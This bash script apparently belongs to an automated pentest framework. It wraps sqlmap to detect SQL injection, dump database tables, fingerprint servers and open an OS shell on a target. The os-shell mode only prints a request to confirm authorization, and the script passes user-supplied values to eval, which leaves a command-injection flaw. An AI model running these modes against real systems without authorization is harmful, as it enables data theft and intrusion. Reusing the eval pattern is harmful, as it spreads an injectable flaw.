#!/usr/bin/env bash
set -euo pipefail

# =============================================================================
# sqlmap_runner.sh — Safe SQLMap Integration
# Only runs on CONFIRMED SQL injection, never during Phase 1-2 probing.
# Phase 3.5 exploitation tool — used after manual SQLi confirmation.
# =============================================================================

VERSION="1.0.0"
TARGET_URL=""
REQUEST_FILE=""
OUTPUT_DIR=""
MODE="detect"
DBMS=""
COOKIE=""
HEADERS=""
PARAM=""
TECHNIQUE="BEUSTQ"
LEVEL=3
RISK=2
THREADS=1

usage() {
    cat <<EOF
Usage: $0 --url <target_url> --output-dir <path> [options]

Safe SQLMap integration — only for confirmed SQLi exploitation.

Options:
  --url <url>             Target URL with the vulnerable parameter
  --request-file <file>   Raw HTTP request file (alternative to --url)
  --output-dir <path>     Output directory (required)
  --mode <mode>           Mode: detect | dump | fingerprint | os-shell (default: detect)
  --param <param>         Vulnerable parameter name
  --cookie <cookie>       Session cookie
  --header <header>       Additional header (can repeat)
  --dbms <dbms>           Database type (mysql, postgresql, mssql, oracle, sqlite)
  --technique <types>     SQLMap technique: B=boolean, E=error, U=union, S=stacked, T=time, Q=inline (default: BEUSTQ)
  --level <N>             Test level 1-5 (default: 3)
  --risk <N>              Risk level 1-3 (default: 2)
  --threads <N>           Threads (default: 1)
  --help                  Show this help

SAFETY: This tool MUST ONLY be used on endpoints where SQL injection has been
MANUALLY CONFIRMED by the Worker in Phase 3. Never auto-run sqlmap on all parameters.

Output:
  <output-dir>/sqlmap_output/     — Raw sqlmap output
  <output-dir>/sqlmap_summary.json — Structured results for the Lead
EOF
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --url) TARGET_URL="$2"; shift 2 ;;
        --request-file) REQUEST_FILE="$2"; shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --mode) MODE="$2"; shift 2 ;;
        --param) PARAM="$2"; shift 2 ;;
        --cookie) COOKIE="$2"; shift 2 ;;
        --header) HEADERS="$HEADERS -H '$2'"; shift 2 ;;
        --dbms) DBMS="$2"; shift 2 ;;
        --technique) TECHNIQUE="$2"; shift 2 ;;
        --level) LEVEL="$2"; shift 2 ;;
        --risk) RISK="$2"; shift 2 ;;
        --threads) THREADS="$2"; shift 2 ;;
        --help) usage ;;
        *) echo "[ERROR] Unknown flag: $1"; usage ;;
    esac
done

if [[ -z "$TARGET_URL" && -z "$REQUEST_FILE" ]]; then
    echo "[ERROR] --url or --request-file is required"
    usage
fi

if [[ -z "$OUTPUT_DIR" ]]; then
    echo "[ERROR] --output-dir is required"
    usage
fi

SQLMAP_DIR="$OUTPUT_DIR/sqlmap_output"
mkdir -p "$SQLMAP_DIR"

echo "============================================"
echo "  SQLMap Runner (Phase 3.5 Exploitation)"
echo "  Mode: $MODE"
echo "============================================"

if ! command -v sqlmap &>/dev/null; then
    echo "[!] sqlmap not found. Install: apt install sqlmap or pip install sqlmap"
    echo "    Recommend: pip install sqlmap"
    exit 1
fi

# Build sqlmap args
SQLMAP_ARGS="--batch --random-agent"

if [[ -n "$TARGET_URL" ]]; then
    SQLMAP_ARGS="$SQLMAP_ARGS -u '$TARGET_URL'"
elif [[ -n "$REQUEST_FILE" ]]; then
    SQLMAP_ARGS="$SQLMAP_ARGS -r '$REQUEST_FILE'"
fi

if [[ -n "$PARAM" ]]; then
    SQLMAP_ARGS="$SQLMAP_ARGS -p '$PARAM'"
fi

if [[ -n "$COOKIE" ]]; then
    SQLMAP_ARGS="$SQLMAP_ARGS --cookie='$COOKIE'"
fi

if [[ -n "$DBMS" ]]; then
    SQLMAP_ARGS="$SQLMAP_ARGS --dbms=$DBMS"
fi

SQLMAP_ARGS="$SQLMAP_ARGS --technique=$TECHNIQUE"
SQLMAP_ARGS="$SQLMAP_ARGS --level=$LEVEL --risk=$RISK"
SQLMAP_ARGS="$SQLMAP_ARGS --threads=$THREADS"
SQLMAP_ARGS="$SQLMAP_ARGS --output-dir='$SQLMAP_DIR'"
SQLMAP_ARGS="$SQLMAP_ARGS --flush-session"

echo "[*] Running sqlmap..."
echo "  => Mode: $MODE"

case "$MODE" in
    detect)
        echo "  => Detecting injection parameters and database fingerprint..."
        eval "sqlmap $SQLMAP_ARGS --dbs --no-cast 2>/dev/null" || true
        ;;
    dump)
        echo "  => Extracting database schema and data..."
        eval "sqlmap $SQLMAP_ARGS --dbs --tables --dump --start=1 --stop=10 2>/dev/null" || true
        ;;
    fingerprint)
        echo "  => Database fingerprinting..."
        eval "sqlmap $SQLMAP_ARGS --fingerprint --banner --current-user --current-db --hostname 2>/dev/null" || true
        ;;
    os-shell)
        echo "  [!] OS shell mode — HIGH IMPACT. Confirm this is authorized."
        eval "sqlmap $SQLMAP_ARGS --os-shell 2>/dev/null" || true
        ;;
    *)
        echo "[ERROR] Unknown mode: $MODE"
        exit 1
        ;;
esac

# =============================================================================
# Process Results
# =============================================================================
echo "[*] Processing sqlmap results..."

python3 <<PYEOF > "$OUTPUT_DIR/sqlmap_summary.json"
import json, os, glob, re

sqlmap_dir = "$SQLMAP_DIR"
summary = {
    "tool": "sqlmap",
    "mode": "$MODE",
    "databases_found": [],
    "tables_found": 0,
    "data_extracted_rows": 0,
    "fingerprint": {},
    "os_access": False,
}

# Parse sqlmap log files for key findings
log_dir = os.path.join(sqlmap_dir, "*.log")
log_files = glob.glob(log_dir) if os.path.exists(sqlmap_dir) else []

for log_file in log_files:
    try:
        with open(log_file, 'r', errors='ignore') as f:
            content = f.read()
            # Find database names
            db_matches = re.findall(r'\[\*\]\s+(\w+)', content)
            summary["databases_found"].extend(db_matches)
            
            # Find table count
            table_matches = re.findall(r'\[(\d+)\s+tables?\]', content)
            if table_matches:
                summary["tables_found"] += sum(int(m) for m in table_matches)
            
            # Find fingerprint info
            banner = re.search(r'banner:\s*[\'"](.+?)[\'"]', content)
            if banner:
                summary["fingerprint"]["banner"] = banner.group(1)
            
            current_db = re.search(r'current database:\s*[\'"](.+?)[\'"]', content)
            if current_db:
                summary["fingerprint"]["current_db"] = current_db.group(1)
            
            current_user = re.search(r'current user:\s*[\'"](.+?)[\'"]', content)
            if current_user:
                summary["fingerprint"]["current_user"] = current_user.group(1)
                
    except:
        continue

summary["databases_found"] = list(set(summary["databases_found"]))

# Check if OS access was achieved
if os.path.exists(os.path.join(sqlmap_dir, "os-shell")):
    summary["os_access"] = True

print(json.dumps(summary, indent=2))
PYEOF

echo "  => Summary: $OUTPUT_DIR/sqlmap_summary.json"
echo ""
echo "============================================"
echo "  SQLMAP RUN COMPLETE"
echo "============================================"
